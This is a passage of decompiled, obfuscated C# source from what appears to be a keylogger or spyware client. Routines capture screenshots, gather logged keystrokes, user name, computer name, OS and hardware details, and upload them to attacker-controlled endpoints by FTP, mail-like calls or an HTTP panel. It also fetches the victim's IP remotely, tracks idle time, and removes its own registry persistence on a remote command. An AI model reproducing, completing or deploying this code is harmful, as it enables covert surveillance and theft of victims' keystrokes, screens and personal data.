									num6 = 401593587u;
									continue;
								}
								goto IL_224;
							case 4u:
								goto IL_224;
							case 5u:
								num6 = (num2 * 1835405076u ^ 558909318u);
								continue;
							}
							goto Block_17;
							IL_224:
							managementObject2 = (ManagementObject)enumerator2.Current;
							num6 = 647358075u;
						}
					}
					Block_17:;
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator2;
					if (enumerator2 != null)
					{
						for (;;)
						{
							IL_2EB:
							uint num7 = 1499268370u;
							for (;;)
							{
								uint num2;
								switch ((num2 = (num7 ^ 1235427540u)) % 3u)
								{
								case 1u:
									((IDisposable)enumerator2).Dispose();
									num7 = (num2 * 2032574076u ^ 798418715u);
									continue;
								case 2u:
									goto IL_2EB;
								}
								goto Block_20;
							}
						}
						Block_20:;
					}
				}
				text2 = text3;
				goto IL_421;
			}
			if (als == afg.hp.VideocardMem)
			{
				string inputStr;
				try
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator3 = managementObjectSearcher.Get().GetEnumerator();
					for (;;)
					{
						IL_389:
						if (enumerator3.MoveNext())
						{
							goto IL_36D;
						}
						uint num8 = 2105703371u;
						ManagementObject managementObject3;
						for (;;)
						{
							IL_341:
							uint num2;
							switch ((num2 = (num8 ^ 1235427540u)) % 5u)
							{
							case 0u:
								goto IL_389;
							case 1u:
								goto IL_36D;
							case 3u:
								num8 = 126030236u;
								continue;
							case 4u:
								inputStr = managementObject3.GetPropertyValue(<Module>.smethod_0(596496)).ToString();
								num8 = (num2 * 1611742117u ^ 1732942660u);
								continue;
							}
							goto Block_22;
						}
						IL_36D:
						managementObject3 = (ManagementObject)enumerator3.Current;
						num8 = 308332389u;
						goto IL_341;
					}
					Block_22:;
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator3;
					if (enumerator3 != null)
					{
						for (;;)
						{
							IL_3D7:
							uint num9 = 109015962u;
							for (;;)
							{
								uint num2;
								switch ((num2 = (num9 ^ 1235427540u)) % 3u)
								{
								case 0u:
									goto IL_3D7;
								case 1u:
									((IDisposable)enumerator3).Dispose();
									num9 = (num2 * 3602494264u ^ 2266023220u);
									continue;
								}
								goto Block_26;
							}
						}
						Block_26:;
					}
				}
				text2 = Conversions.ToString(Math.Round(Convert.ToDouble(Conversion.Val(inputStr)) / 1024.0 / 1024.0, 2)) + " MB";
				goto IL_421;
			}
			goto IL_421;
			IL_419:
			text2 = computerInfo.OSFullName;
			IL_421:
			result = text2;
		}
		catch (Exception ex)
		{
			result = <Module>.smethod_0(597312);
		}
		return result;
	}

	// Token: 0x06000057 RID: 87 RVA: 0x0001B31C File Offset: 0x0001951C
	public static void amu()
	{
		try
		{
			string processName = Process.GetCurrentProcess().ProcessName;
			int id = Process.GetCurrentProcess().Id;
			for (;;)
			{
				IL_CC:
				uint num = 695491350u;
				for (;;)
				{
					uint num2;
					int num3;
					Process[] array;
					Process process;
					switch ((num2 = (num ^ 1000394672u)) % 8u)
					{
					case 0u:
						num3 = 0;
						num = (num2 * 683920461u ^ 44947769u);
						continue;
					case 1u:
						if (num3 >= array.Length)
						{
							num = 29184125u;
							continue;
						}
						goto IL_1B;
					case 2u:
						goto IL_31;
					case 3u:
						process.Kill();
						num = (num2 * 548314753u ^ 2485177473u);
						continue;
					case 4u:
						goto IL_CC;
					case 6u:
					{
						Process[] processesByName = Process.GetProcessesByName(processName);
						array = processesByName;
						num = (num2 * 3471973317u ^ 218236390u);
						continue;
					}
					case 7u:
						goto IL_1B;
					}
					goto Block_4;
					IL_1B:
					process = array[num3];
					if (process.Id != id)
					{
						num = 1349554891u;
						continue;
					}
					IL_31:
					checked
					{
						num3++;
						num = 217158129u;
					}
				}
			}
			Block_4:;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000058 RID: 88 RVA: 0x0001B41C File Offset: 0x0001961C
	public static ImageCodecInfo anp(ImageFormat anr)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = 0;
		checked
		{
			for (;;)
			{
				IL_6A:
				if (num < imageEncoders.Length)
				{
					goto IL_4C;
				}
				int num2 = -1789296578;
				for (;;)
				{
					IL_1A:
					switch ((num2 ^ -1209746446) % 6)
					{
					case 1:
						goto IL_0A;
					case 2:
						goto IL_6A;
					case 3:
						goto IL_74;
					case 4:
						goto IL_4C;
					case 5:
						num2 = -1695810184;
						continue;
					}
					goto Block_1;
				}
				IL_0A:
				num++;
				num2 = -573416344;
				goto IL_1A;
				IL_4C:
				if (imageEncoders[num].FormatID == anr.Guid)
				{
					num2 = -860234891;
					goto IL_1A;
				}
				goto IL_0A;
			}
			Block_1:
			return null;
			IL_74:
			return imageEncoders[num];
		}
	}

	// Token: 0x06000059 RID: 89 RVA: 0x0001B4A0 File Offset: 0x000196A0
	public static string anv(string any, string anx, string anw, int anq)
	{
		string result;
		try
		{
			string input = Regex.Split(any, anx)[checked(anq + 1)];
			result = Regex.Split(input, anw)[0];
		}
		catch (Exception ex)
		{
			result = "";
		}
		return result;
	}

	// Token: 0x0600005A RID: 90 RVA: 0x0001B4E8 File Offset: 0x000196E8
	private static void aor(object sender, ElapsedEventArgs e)
	{
		try
		{
			string str = Conversions.ToString(afg.ajw(10));
			for (;;)
			{
				IL_5D6:
				uint num = 71232018u;
				for (;;)
				{
					uint num2;
					string text;
					switch ((num2 = (num ^ 1184810531u)) % 26u)
					{
					case 0u:
						goto IL_105;
					case 1u:
					{
						string bdl = text;
						string format;
						string[] array = new string[]
						{
							<Module>.smethod_0(595872),
							afg.cfj.Replace("/", "-"),
							"_",
							DateTime.Now.ToString(format),
							<Module>.smethod_0(594768)
						};
						afg.bdk(bdl, string.Concat(array));
						num = (num2 * 3613824322u ^ 4142982651u);
						continue;
					}
					case 2u:
						if (afg.cdu)
						{
							num = (num2 * 3400520498u ^ 4118656619u);
							continue;
						}
						goto IL_144;
					case 3u:
						text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + str + <Module>.smethod_0(597360);
						num = (num2 * 2631863627u ^ 932222409u);
						continue;
					case 4u:
					{
						string[] array;
						array[5] = SystemInformation.ComputerName;
						num = (num2 * 481052698u ^ 1616249408u);
						continue;
					}
					case 5u:
					{
						string[] array;
						array[3] = SystemInformation.UserName;
						num = (num2 * 4083344725u ^ 974427524u);
						continue;
					}
					case 6u:
					{
						string format = <Module>.smethod_0(596080);
						num = (num2 * 2412629917u ^ 3726898724u);
						continue;
					}
					case 7u:
					{
						string[] array;
						array[7] = hj.hk.Info.OSFullName;
						array[8] = <Module>.smethod_0(595456);
						num = (num2 * 1035206369u ^ 1046177612u);
						continue;
					}
					case 8u:
					{
						string[] array;
						array[4] = <Module>.smethod_0(595488);
						num = (num2 * 2176042159u ^ 3809053497u);
						continue;
					}
					case 9u:
					{
						Size blockRegionSize = new Size(hj.hk.Screen.Bounds.Width, hj.hk.Screen.Bounds.Height);
						Rectangle bounds = hj.hk.Screen.Bounds;
						num = (num2 * 17584529u ^ 4015222691u);
						continue;
					}
					case 10u:
					{
						string[] array;
						array[9] = afg.alr(afg.hp.ProcessorName);
						num = (num2 * 3552519842u ^ 561062599u);
						continue;
					}
					case 11u:
						num = (num2 * 3867608667u ^ 39425564u);
						continue;
					case 12u:
						goto IL_127;
					case 13u:
					{
						string format2 = <Module>.smethod_0(596960);
						string bhj = SystemInformation.UserName + "/" + SystemInformation.ComputerName + <Module>.smethod_0(595856);
						string[] array = new string[15];
						array[0] = <Module>.smethod_0(595648);
						DateTime now;
						array[1] = now.ToString(format2);
						num = (num2 * 132506283u ^ 4273753913u);
						continue;
					}
					case 14u:
						goto IL_144;
					case 15u:
					{
						string[] array;
						array[2] = <Module>.smethod_0(595696);
						num = (num2 * 1474103579u ^ 771940217u);
						continue;
					}
					case 16u:
					{
						string text2 = Convert.ToBase64String(File.ReadAllBytes(text));
						afg.bly(string.Format(<Module>.smethod_0(597072), new object[]
						{
							<Module>.smethod_0(597120),
							afg.cfg,
							DateTime.Now.ToString(afg.cfh),
							afg.cfj,
							null,
							text2,
							null,
							null,
							null,
							null,
							null,
							null,
							null
						}));
						num = (num2 * 2123084203u ^ 841385804u);
						continue;
					}
					case 17u:
						goto IL_5D6;
					case 18u:
						num = (num2 * 2463571448u ^ 19099205u);
						continue;
					case 19u:
					{
						Rectangle bounds;
						Bitmap bitmap = new Bitmap(bounds.Width, hj.hk.Screen.Bounds.Height);
						num = (num2 * 3349263583u ^ 376905821u);
						continue;
					}
					case 20u:
					{
						string[] array;
						array[13] = afg.cfk;
						array[14] = <Module>.smethod_0(596240);
						string bhk = string.Concat(array);
						string bhj;
						afg.bgq(<Module>.smethod_0(596032), bhj, bhk, text, "");
						num = (num2 * 2018122569u ^ 2062291015u);
						continue;
					}
					case 22u:
					{
						DateTime now = DateTime.Now;
						num = (num2 * 2763126331u ^ 3838169584u);
						continue;
					}
					case 23u:
					{
						EncoderParameters encoderParameters = new EncoderParameters(1);
						System.Drawing.Imaging.Encoder quality = System.Drawing.Imaging.Encoder.Quality;
						ImageCodecInfo encoder = afg.anp(ImageFormat.Jpeg);
						EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
						encoderParameters.Param[0] = encoderParameter;
						Bitmap bitmap;
						Graphics graphics = Graphics.FromImage(bitmap);
						Graphics graphics2 = graphics;
						Point point = new Point(0, 0);
						Point upperLeftSource = point;
						Point upperLeftDestination = new Point(0, 0);
						Size blockRegionSize;
						graphics2.CopyFromScreen(upperLeftSource, upperLeftDestination, blockRegionSize);
						bitmap.Save(text, encoder, encoderParameters);
						if (Operators.CompareString(afg.ceg, <Module>.smethod_0(597152), false) == 0)
						{
							num = (num2 * 3813062620u ^ 1538156373u);
							continue;
						}
						goto IL_105;
					}
					case 24u:
					{
						string[] array;
						array[10] = <Module>.smethod_0(596272);
						array[11] = afg.alr(afg.hp.AmountOfMemory);
						array[12] = <Module>.smethod_0(596320);
						num = (num2 * 455480426u ^ 2200671435u);
						continue;
					}
					case 25u:
					{
						string[] array;
						array[6] = <Module>.smethod_0(595408);
						num = (num2 * 3192981464u ^ 2199113826u);
						continue;
					}
					}
					goto Block_6;
					IL_105:
					if (Operators.CompareString(afg.ceg, <Module>.smethod_0(596912), false) == 0)
					{
						num = 2146322249u;
						continue;
					}
					IL_127:
					if (Operators.CompareString(afg.ceg, "ftp", false) == 0)
					{
						num = 2052565291u;
						continue;
					}
					IL_144:
					File.Delete(text);
					num = 1364020138u;
				}
			}
			Block_6:;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600005B RID: 91 RVA: 0x0001BB04 File Offset: 0x00019D04
	private static void asx(object sender, ElapsedEventArgs e)
	{
		afg.cdt.cbSize = Marshal.SizeOf(afg.cdt);
		afg.cdt.dwTime = 0;
		for (;;)
		{
			IL_D3:
			uint num = 4041832155u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 4156638339u)) % 6u)
				{
				case 0u:
					goto IL_D3;
				case 1u:
					if (checked((int)Math.Round((double)(Environment.TickCount - afg.cdt.dwTime) / 1000.0)) > 600)
					{
						num = (num2 * 3269196479u ^ 2724740573u);
						continue;
					}
					goto IL_41;
				case 2u:
					afg.GetLastInputInfo(ref afg.cdt);
					num = (num2 * 2443158525u ^ 419821854u);
					continue;
				case 4u:
					goto IL_41;
				case 5u:
					afg.cdu = false;
					num = (num2 * 120009256u ^ 714122326u);
					continue;
				}
				return;
				IL_41:
				afg.cdu = true;
				num = 2226685598u;
			}
		}
	}

	// Token: 0x0600005C RID: 92 RVA: 0x0001BBEC File Offset: 0x00019DEC
	private static void asz()
	{
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += afg.asx;
		timer.Enabled = true;
		for (;;)
		{
			IL_80:
			uint num = 3390109305u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 3208049316u)) % 4u)
				{
				case 1u:
					timer.Interval = 1000.0;
					num = (num2 * 3650625689u ^ 1380393238u);
					continue;
				case 2u:
					goto IL_80;
				case 3u:
					timer.Start();
					num = (num2 * 979496667u ^ 4182557621u);
					continue;
				}
				return;
			}
		}
	}

	// Token: 0x0600005D RID: 93 RVA: 0x0001BC80 File Offset: 0x00019E80
	private static void atv(object sender, ElapsedEventArgs e)
	{
		if (Operators.CompareString(afg.cdv, "", false) != 0)
		{
			string text;
			for (;;)
			{
				IL_61:
				uint num = 2901057609u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 2854940870u)) % 3u)
					{
					case 0u:
						goto IL_61;
					case 1u:
						text = Path.GetTempPath() + <Module>.smethod_0(594816);
						num = (num2 * 1159620275u ^ 2638331253u);
						continue;
					}
					goto Block_2;
				}
			}
			Block_2:
			DateTime now = DateTime.Now;
			string format = <Module>.smethod_0(594608);
			string obj = afg.cdv;
			lock (obj)
			{
				afg.cfr += afg.cdv;
				afg.cdv = "";
			}
			string[] array;
			if (Operators.CompareString(afg.ceg, <Module>.smethod_0(594656), false) == 0)
			{
				try
				{
					if (File.Exists(text))
					{
						goto IL_184;
					}
					goto IL_1B4;
					uint num3;
					for (;;)
					{
						IL_189:
						uint num2;
						switch ((num2 = (num3 ^ 2854940870u)) % 4u)
						{
						case 0u:
							goto IL_184;
						case 1u:
							afg.bly(string.Format(<Module>.smethod_0(594576), new object[]
							{
								<Module>.smethod_0(594368),
								afg.cfg,
								DateTime.Now.ToString(afg.cfh),
								afg.cfj,
								Uri.EscapeDataString(File.ReadAllText(text)),
								null,
								null,
								null,
								null,
								null,
								null,
								null,
								null
							}));
							File.Delete(text);
							num3 = (num2 * 229928102u ^ 1941536971u);
							continue;
						case 3u:
							goto IL_1B4;
						}
						break;
					}
					return;
					IL_184:
					num3 = 2473147319u;
					goto IL_189;
					IL_1B4:
					afg.bly(string.Format(<Module>.smethod_0(594416), new object[]
					{
						<Module>.smethod_0(595232),
						afg.cfg,
						DateTime.Now.ToString(afg.cfh),
						afg.cfj,
						Uri.EscapeDataString(afg.cfr),
						null,
						null,
						null,
						null,
						null,
						null,
						null,
						null
					}));
					afg.cfr = "";
					num3 = 3240468936u;
					goto IL_189;
				}
				catch (Exception ex)
				{
					string path = text;
					array = new string[]
					{
						<Module>.smethod_0(595152),
						DateTime.Now.ToString(afg.cfh),
						<Module>.smethod_0(595200),
						afg.cfr,
						<Module>.smethod_0(594992)
					};
					File.AppendAllText(path, string.Concat(array));
					afg.cfr = "";
					return;
				}
			}
			if (Operators.CompareString(afg.ceg, <Module>.smethod_0(595040), false) == 0)
			{
				try
				{
					if (File.Exists(text))
					{
						goto IL_431;
					}
					goto IL_5C5;
					uint num4;
					string bhj2;
					for (;;)
					{
						IL_579:
						uint num2;
						switch ((num2 = (num4 ^ 2854940870u)) % 13u)
						{
						case 0u:
							array[8] = <Module>.smethod_0(594160);
							array[9] = afg.alr(afg.hp.ProcessorName);
							array[10] = <Module>.smethod_0(593952);
							num4 = (num2 * 3737309045u ^ 1533027899u);
							continue;
						case 1u:
						{
							string bhj = SystemInformation.UserName + "/" + SystemInformation.ComputerName + <Module>.smethod_0(594960);
							array = new string[6];
							array[0] = <Module>.smethod_0(593728);
							array[1] = now.ToString(format);
							array[2] = <Module>.smethod_0(593776);
							num4 = (num2 * 2691700391u ^ 2411587601u);
							continue;
						}
						case 2u:
							goto IL_5C5;
						case 3u:
							array = new string[16];
							num4 = (num2 * 3462741302u ^ 2178741054u);
							continue;
						case 4u:
							array[0] = <Module>.smethod_0(593328);
							num4 = (num2 * 1117043322u ^ 4039793035u);
							continue;
						case 5u:
						{
							array[3] = afg.cfk;
							array[4] = <Module>.smethod_0(593568);
							array[5] = File.ReadAllText(text);
							string bhk = string.Concat(array);
							string bhj;
							afg.bgq(<Module>.smethod_0(593488), bhj, bhk, "", "");
							File.Delete(text);
							num4 = (num2 * 3648397692u ^ 1584403635u);
							continue;
						}
						case 6u:
							goto IL_431;
						case 7u:
							array[1] = now.ToString(format);
							num4 = (num2 * 2564497150u ^ 3229970579u);
							continue;
						case 8u:
							array[2] = <Module>.smethod_0(593376);
							array[3] = SystemInformation.UserName;
							array[4] = <Module>.smethod_0(594320);
							array[5] = SystemInformation.ComputerName;
							num4 = (num2 * 1239377091u ^ 833146991u);
							continue;
						case 9u:
						{
							array[15] = afg.cfr;
							string bhk2 = string.Concat(array);
							afg.bgq(<Module>.smethod_0(592688), bhj2, bhk2, "", "");
							afg.cfr = "";
							num4 = (num2 * 3888222552u ^ 2060321361u);
							continue;
						}
						case 10u:
							array[6] = <Module>.smethod_0(594112);
							array[7] = hj.hk.Info.OSFullName;
							num4 = (num2 * 1902770772u ^ 1758370835u);
							continue;
						case 12u:
							array[11] = afg.alr(afg.hp.AmountOfMemory);
							array[12] = <Module>.smethod_0(593872);
							array[13] = afg.cfk;
							array[14] = <Module>.smethod_0(593920);
							num4 = (num2 * 92413296u ^ 1567913161u);
							continue;
						}
						break;
					}
					return;
					IL_431:
					num4 = 3256014541u;
					goto IL_579;
					IL_5C5:
					bhj2 = SystemInformation.UserName + "/" + SystemInformation.ComputerName + <Module>.smethod_0(593536);
					num4 = 3210583915u;
					goto IL_579;
				}
				catch (Exception ex2)
				{
					string path2 = text;
					array = new string[]
					{
						<Module>.smethod_0(592736),
						DateTime.Now.ToString(afg.cfh),
						<Module>.smethod_0(592656),
						afg.cfr,
						<Module>.smethod_0(592448)
					};
					File.AppendAllText(path2, string.Concat(array));
					afg.cfr = "";
					return;
				}
			}
			if (Operators.CompareString(afg.ceg, "ftp", false) == 0)
			{
				try
				{
					string format2 = <Module>.smethod_0(592496);
					if (File.Exists(text))
					{
						goto IL_9DC;
					}
					goto IL_A25;
					uint num5;
					string[] array2;
					for (;;)
					{
						IL_9E1:
						uint num2;
						switch ((num2 = (num5 ^ 2854940870u)) % 11u)
						{
						case 0u:
							goto IL_9DC;
						case 1u:
							array2[0] = <Module>.smethod_0(591408);
							num5 = (num2 * 4247726485u ^ 2116942253u);
							continue;
						case 2u:
							array[2] = "__";
							num5 = (num2 * 752787086u ^ 4154957477u);
							continue;
						case 4u:
							array[1] = afg.cfj.Replace("/", "-");
							num5 = (num2 * 3979162215u ^ 1516653335u);
							continue;
						case 5u:
							array2[1] = afg.cfj.Replace("/", "-");
							num5 = (num2 * 1488112025u ^ 940203602u);
							continue;
						case 6u:
						{
							array2[2] = "__";
							array2[3] = DateTime.Now.ToString(format2);
							array2[4] = <Module>.smethod_0(591456);
							string bcv = string.Concat(array2);
							array = new string[]
							{
								<Module>.smethod_0(591376),
								now.ToString(format),
								<Module>.smethod_0(592192),
								SystemInformation.UserName,
								<Module>.smethod_0(592240),
								SystemInformation.ComputerName,
								<Module>.smethod_0(592032),
								hj.hk.Info.OSFullName,
								<Module>.smethod_0(591952),
								afg.alr(afg.hp.ProcessorName),
								<Module>.smethod_0(592000),
								afg.alr(afg.hp.AmountOfMemory),
								<Module>.smethod_0(591792),
								afg.cfk,
								<Module>.smethod_0(591840),
								afg.cfr,
								<Module>.smethod_0(590736)
							};
							afg.bcu(bcv, string.Concat(array));
							num5 = (num2 * 3209851931u ^ 149383966u);
							continue;
						}
						case 7u:
							goto IL_A25;
						case 8u:
							array = new string[5];
							num5 = (num2 * 3679454447u ^ 263624076u);
							continue;
						case 9u:
							array[0] = <Module>.smethod_0(592288);
							num5 = (num2 * 1910437978u ^ 3896617624u);
							continue;
						case 10u:
						{
							array[3] = DateTime.Now.ToString(format2);
							array[4] = <Module>.smethod_0(593232);
							string bcv2 = string.Concat(array);
							array2 = new string[]
							{
								<Module>.smethod_0(593280),
								now.ToString(format),
								<Module>.smethod_0(593072),
								SystemInformation.UserName,
								<Module>.smethod_0(593120),
								SystemInformation.ComputerName,
								<Module>.smethod_0(593040),
								hj.hk.Info.OSFullName,
								<Module>.smethod_0(592832),
								afg.alr(afg.hp.ProcessorName),
								<Module>.smethod_0(592880),
								afg.alr(afg.hp.AmountOfMemory),
								<Module>.smethod_0(591648),
								afg.cfk,
								<Module>.smethod_0(591568),
								File.ReadAllText(text),
								<Module>.smethod_0(591616)
							};
							afg.bcu(bcv2, string.Concat(array2));
							File.Delete(text);
							num5 = (num2 * 3925541465u ^ 3619409037u);
							continue;
						}
						}
						break;
					}
					afg.cfr = "";
					return;
					IL_9DC:
					num5 = 2872564743u;
					goto IL_9E1;
					IL_A25:
					array2 = new string[5];
					num5 = 3685672852u;
					goto IL_9E1;
				}
				catch (Exception ex3)
				{
					for (;;)
					{
						IL_AF2:
						uint num6 = 2572303485u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num6 ^ 2854940870u)) % 3u)
							{
							case 0u:
								goto IL_AF2;
							case 1u:
							{
								string path3 = text;
								string[] array2 = new string[]
								{
									<Module>.smethod_0(590528),
									DateTime.Now.ToString(afg.cfh),
									<Module>.smethod_0(590576),
									afg.cfr,
									<Module>.smethod_0(590368)
								};
								File.AppendAllText(path3, string.Concat(array2));
								afg.cfr = "";
								num6 = (num2 * 1874452851u ^ 2507641421u);
								continue;
							}
							}
							goto Block_21;
						}
					}
					Block_21:;
				}
			}
		}
	}

	// Token: 0x0600005E RID: 94 RVA: 0x0001C7F4 File Offset: 0x0001A9F4
	public static void ayx(object sender, ElapsedEventArgs e)
	{
		try
		{
			afg.cfk = new WebClient().DownloadString(<Module>.smethod_0(590288));
			NewLateBinding.LateCall(sender, null, <Module>.smethod_0(590336), new object[0], null, null, null, true);
			NewLateBinding.LateSet(sender, null, <Module>.smethod_0(591152), new object[]
			{
				false
			}, null, null);
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_9D:
				uint num = 1478600433u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 180869051u)) % 3u)
					{
					case 1u:
						num = (num2 * 3608805841u ^ 1900415925u);
						continue;
					case 2u:
						goto IL_9D;
					}
					goto Block_3;
				}
			}
			Block_3:;
		}
	}

	// Token: 0x0600005F RID: 95 RVA: 0x0001C8B8 File Offset: 0x0001AAB8
	public static void axw(object sender, ElapsedEventArgs e)
	{
		try
		{
			afg.bly(string.Format(<Module>.smethod_0(591200), new object[]
			{
				<Module>.smethod_0(591120),
				afg.cfg,
				DateTime.Now.ToString(afg.cfh),
				afg.cfj,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000060 RID: 96 RVA: 0x0001C95C File Offset: 0x0001AB5C
	public static void aqz()
	{
		try
		{
			afg.bly(string.Format(<Module>.smethod_0(590912), new object[]
			{
				<Module>.smethod_0(590960),
				afg.cfg,
				DateTime.Now.ToString(afg.cfh),
				afg.cfj,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000061 RID: 97 RVA: 0x0001CA00 File Offset: 0x0001AC00
	public static void bcf()
	{
		try
		{
			DateTime now = DateTime.Now;
			afg.bly(string.Format(<Module>.smethod_0(590752), new object[]
			{
				<Module>.smethod_0(606032),
				afg.cfg,
				DateTime.Now.ToString(afg.cfh),
				afg.cfj,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000062 RID: 98 RVA: 0x0001CAAC File Offset: 0x0001ACAC
	private static void bcl(object sender, ElapsedEventArgs e)
	{
		try
		{
			string text = afg.bly(string.Format(<Module>.smethod_0(606080), new object[]
			{
				<Module>.smethod_0(605872),
				afg.cfg,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
			if (text.Contains(<Module>.smethod_0(605920)))
			{
				try
				{
					Registry.CurrentUser.OpenSubKey(<Module>.smethod_0(605840), true).DeleteValue(<Module>.smethod_0(605632));
				}
				catch (Exception ex)
				{
					for (;;)
					{
						IL_E0:
						uint num = 4042676505u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num ^ 2823216286u)) % 3u)
							{
							case 1u:
								num = (num2 * 3305154583u ^ 1907596569u);
								continue;
							case 2u:
								goto IL_E0;
							}
							goto Block_8;
						}
					}
					Block_8:;
				}
				try
				{
					Registry.CurrentUser.OpenSubKey(<Module>.smethod_0(605680), true).DeleteValue(<Module>.smethod_0(606496));
				}
				catch (Exception ex2)
				{
				}
				try
				{
					File.Delete(afg.cet);
				}
				catch (Exception ex3)
				{
				}
				try
				{
					afg.bjx();
				}
				catch (Exception ex4)
				{
				}
				Application.Exit();
			}
		}
		catch (Exception ex5)
		{
		}
	}

	// Token: 0x06000063 RID: 99 RVA: 0x0001CC90 File Offset: 0x0001AE90
	public static void bcr()
	{
		try
		{
			string text = afg.bly(string.Format(<Module>.smethod_0(606416), new object[]
			{
				<Module>.smethod_0(606464),
				afg.cfg,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null,
				null
			}));
			if (text.Contains(<Module>.smethod_0(606256)))
			{
				try
				{
					Registry.CurrentUser.OpenSubKey(<Module>.smethod_0(606304), true).DeleteValue(<Module>.smethod_0(606224));
				}
				catch (Exception ex)
				{
				}
				try
				{
					Registry.CurrentUser.OpenSubKey(<Module>.smethod_0(604992), true).DeleteValue(<Module>.smethod_0(605040));
				}
				catch (Exception ex2)
				{
				}
				try
				{
					File.Delete(afg.cet);
				}
				catch (Exception ex3)
				{
				}
				try
				{
					afg.bjx();
				}
				catch (Exception ex4)
				{
				}
				Application.Exit();
			}
		}
		catch (Exception ex5)
		{
		}
	}

	// Token: 0x06000064 RID: 100 RVA: 0x0001CE34 File Offset: 0x0001B034
	public static void bcu(string bcv, string bcy)
	{
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(<Module>.smethod_0(604832) + bcv);
			for (;;)
			{
				IL_20F:
				uint num = 1317812126u;
				for (;;)
				{
					uint num2;
					object requestStream;
					bool[] array4;
					switch ((num2 = (num ^ 838967215u)) % 8u)
					{
					case 0u:
						goto IL_120;
					case 1u:
						ftpWebRequest.Credentials = new NetworkCredential(<Module>.smethod_0(604752), string.Format(<Module>.smethod_0(604800), '"', '{', '}'));
						num = (num2 * 3419961129u ^ 4073729696u);
						continue;
					case 3u:
					{
						object[] array;
						object obj = RuntimeHelpers.GetObjectValue(array[0]);
						num = (num2 * 4054509692u ^ 2592191819u);
						continue;
					}
					case 4u:
						goto IL_20F;
					case 5u:
					{
						object[] array;
						object instance;
						NewLateBinding.LateSetComplex(instance, null, <Module>.smethod_0(605424), new object[]
						{
							RuntimeHelpers.GetObjectValue(array[2])
						}, null, null, true, false);
						num = (num2 * 4219642136u ^ 105151952u);
						continue;
					}
					case 6u:
					{
						ftpWebRequest.Method = <Module>.smethod_0(604592);
						object obj = Encoding.UTF8.GetBytes(bcy);
						ftpWebRequest.ContentLength = Conversions.ToLong(NewLateBinding.LateGet(obj, null, <Module>.smethod_0(604640), new object[0], null, null, null));
						requestStream = ftpWebRequest.GetRequestStream();
						object instance2 = requestStream;
						Type type = null;
						string memberName = <Module>.smethod_0(605584);
						object[] array2 = new object[3];
						array2[0] = RuntimeHelpers.GetObjectValue(obj);
						array2[1] = 0;
						object[] array3 = array2;
						int num3 = 2;
						object instance = obj;
						array3[num3] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, <Module>.smethod_0(605376), new object[0], null, null, null));
						object[] array = array2;
						object[] arguments = array;
						string[] argumentNames = null;
						Type[] typeArguments = null;
						array4 = new bool[]
						{
							true,
							false,
							true
						};
						NewLateBinding.LateCall(instance2, type, memberName, arguments, argumentNames, typeArguments, array4, true);
						if (array4[0])
						{
							num = (num2 * 2104027312u ^ 3503855372u);
							continue;
						}
						goto IL_120;
					}
					case 7u:
						goto IL_20;
					}
					goto Block_4;
					IL_20:
					NewLateBinding.LateCall(requestStream, null, <Module>.smethod_0(605216), new object[0], null, null, null, true);
					num = 744035213u;
					continue;
					IL_120:
					if (!array4[2])
					{
						goto IL_20;
					}
					num = 934415946u;
				}
			}
			Block_4:;
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_25C:
				uint num4 = 284986930u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num4 ^ 838967215u)) % 3u)
					{
					case 0u:
						goto IL_25C;
					case 2u:
						num4 = (num2 * 1503683941u ^ 1392212136u);
						continue;
					}
					goto Block_6;
				}
			}
			Block_6:;
		}
	}

	// Token: 0x06000065 RID: 101 RVA: 0x0001D0C4 File Offset: 0x0001B2C4
	public static void bdk(string bdl, string bdm)
	{
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(<Module>.smethod_0(605136) + bdm);
			ftpWebRequest.Credentials = new NetworkCredential(<Module>.smethod_0(605184), string.Format(<Module>.smethod_0(603952), '"', '{', '}'));
			Stream requestStream;
			for (;;)
			{
				IL_B3:
				uint num = 1057224865u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 295588714u)) % 3u)
					{
					case 1u:
					{
						ftpWebRequest.Method = <Module>.smethod_0(604000);
						byte[] array = File.ReadAllBytes(bdl);
						requestStream = ftpWebRequest.GetRequestStream();
						requestStream.Write(array, 0, array.Length);
						num = (num2 * 2209455736u ^ 3942437392u);
						continue;
					}
					case 2u:
						goto IL_B3;
					}
					goto Block_2;
				}
			}
			Block_2:
			requestStream.Close();
			requestStream.Dispose();
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_10C:
				uint num3 = 715041228u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num3 ^ 295588714u)) % 3u)
					{
					case 0u:
						goto IL_10C;
					case 1u:
						num3 = (num2 * 1061717315u ^ 1923875700u);
						continue;
					}
					goto Block_4;
				}
			}
			Block_4:;
		}
	}

	// Token: 0x06000066 RID: 102 RVA: 0x0001D1F8 File Offset: 0x0001B3F8
